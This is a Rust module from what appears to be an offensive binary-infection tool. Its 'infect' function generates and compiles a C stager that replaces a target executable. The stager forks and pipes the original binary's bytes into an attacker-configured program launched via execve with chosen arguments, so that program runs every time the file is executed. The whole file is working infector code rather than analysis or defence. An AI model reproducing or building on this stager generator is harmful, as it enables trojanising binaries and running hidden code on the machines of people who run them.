use crate::codegen::c;
use crate::errors::*;
use crate::infect::elf_fwd_stdin::Infect;
use std::path::Path;

fn gen_args_src(args: &[String]) -> Result<String> {
    let mut args_src = String::from("char *args[]={");
    for arg in args {
        args_src.push('"');
        c::escape(arg.as_bytes(), &mut args_src)?;
        args_src.push_str("\", ");
    }
    args_src.push_str("NULL};\n");
    Ok(args_src)
}

pub async fn infect(bin: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
    let exec_path = config.exec_path();
    let args = config.args(exec_path);

    let mut compiler = c::Compiler::spawn(bin).await?;

    info!(
        "Generating stager for exec={:?}, argv[0]={:?}, args={:?}",
        exec_path,
        args[0],
        &args[1..],
    );

    let mut exec_path_escaped = String::new();
    c::escape(exec_path.as_bytes(), &mut exec_path_escaped)?;

    let args_src = gen_args_src(&args)?;

    compiler
        .add_lines(&[
            "#include <stdio.h>\n",
            "#include <stdlib.h>\n",
            "#include <unistd.h>\n",
            "#include <sys/wait.h>\n",
            "extern char **environ;\n",
        ])
        .await?;

    c::define_write_all(&mut compiler).await?;

    compiler
        .add_lines(&[
            "int main(int argc, char** argv) {\n",
            "int pipefd[2];\n",
            "pipe(pipefd);\n",
            "pid_t c = fork();\n",
            "if (c) goto fwd;\n",
            "close(pipefd[1]);\n",
            "if (dup2(pipefd[0], STDIN_FILENO) == -1) return 1;\n",
            &args_src,
            &format!("execve(\"{exec_path_escaped}\", args, environ);\n"),
            "exit(0);\n",
            "fwd:\n",
            "close(pipefd[0]);\n",
            "int f = pipefd[1];\n",
        ])
        .await?;

    c::stream_bin(orig, &mut compiler.stdin).await?;

    compiler
        .add_lines(&[
            "close(f);\n",
            "if (c == -1) return 1;\n",
            "int wstatus;\n",
            "do {\n",
            "if (waitpid(c, &wstatus, 0) == -1) return 1;\n",
            "} while (!WIFEXITED(wstatus) && !WIFSIGNALED(wstatus));\n",
            "exit(0);\n",
            "}\n",
        ])
        .await?;

    let mut pending = compiler.done();
    info!("Waiting for compile to finish...");
    pending.wait().await?;

    Ok(())
}
